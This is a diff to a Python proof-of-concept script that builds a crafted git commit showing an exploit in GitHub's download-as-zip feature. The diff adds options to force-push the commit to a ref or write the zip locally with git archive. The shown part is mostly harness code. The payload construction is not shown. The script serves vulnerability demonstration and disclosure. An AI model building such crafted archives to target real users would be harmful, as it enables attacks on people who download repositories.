@@ -9,10 +9,16 @@
 # https://github.com/thejoshwolfe/poc-github-zip-exploit/tree/b65497e8a662866aaf6d68dc59608ebb620982db
 
 import os, sys, subprocess
+import shlex
 
 def main():
     import argparse
     parser = argparse.ArgumentParser()
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("--push", action="store_true", help=
+        "Push to github and print the download-as-zip link.")
+    group.add_argument("--output", help=
+        "Path to write the zip archive from `git archive`.")
     args = parser.parse_args()
 
     if git("remote", "get-url", "origin") != ["git@github.com:thejoshwolfe/poc-github-zip-exploit.git"]:
@@ -58,13 +64,24 @@ def main():
     ]).encode("utf8"))
 
     [commit_hash] = git("commit-tree", "-m", "poc malicious github repo demonstrating download-as-zip exploit", tree_hash)
-    git("push", "origin", "--force", "{}:{}".format(
-        commit_hash,
-        "refs/misc/poc",
-    ))
-    print(commit_hash)
-    print("https://github.com/thejoshwolfe/poc-github-zip-exploit/tree/" + commit_hash)
-    print("https://github.com/thejoshwolfe/poc-github-zip-exploit/archive/{}.zip".format(commit_hash))
+
+    if args.push:
+        git("push", "origin", "--force", "{}:{}".format(
+            commit_hash,
+            "refs/misc/poc",
+        ))
+        print(commit_hash)
+        print("https://github.com/thejoshwolfe/poc-github-zip-exploit/tree/" + commit_hash)
+        print("https://github.com/thejoshwolfe/poc-github-zip-exploit/archive/{}.zip".format(commit_hash))
+    elif args.output:
+        cmd = [
+            "git", "archive", "--format=zip",
+            "--prefix=poc-github-zip-exploit-" + commit_hash + "/",
+            "--output", args.output,
+            commit_hash,
+        ]
+        print("$ " + shlex.join(cmd))
+        subprocess.run(cmd, cwd=git_repo_dir, check=True)
 
 git_repo_dir = "."
 def git(*args, input=None):
